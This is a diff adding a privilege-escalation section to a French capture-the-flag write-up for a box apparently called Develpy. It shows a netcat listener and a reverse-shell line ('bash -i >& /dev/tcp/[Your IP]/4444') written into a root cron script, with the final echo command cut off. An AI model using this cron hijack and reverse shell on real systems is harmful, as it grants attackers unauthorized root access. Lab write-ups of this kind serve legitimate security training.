@@ -63,3 +63,24 @@ Avec la commande ci-dessus on a le premier flag.
 
 
 ![](img/Develpy_nc_id.png?raw=true)
+
+![](img/Develpy_nc_cron.png?raw=true)
+
+Le fichier root.sh est executé à tout moment par le cron en root.
+En modifiant son contenu on pourra donc exécuter un script pour se connecter au shell root.
+Quand ça serra fait on aurra accès au root.
+
+Démarrons une connexion en écoute(listener) sur notre terminal locale.
+```
+nc -l -vv -p 4444
+```
+4444 est le port que j'ai utilisé,vous pouvez le changer.
+
+Supprimer le fichier root.sh.
+
+Executer la commande ci-dessous pour établir la connection.
+
+```bash
+echo "bash -i >& /dev/tcp/[Your IP]/4444 0>&1" >
+
+```
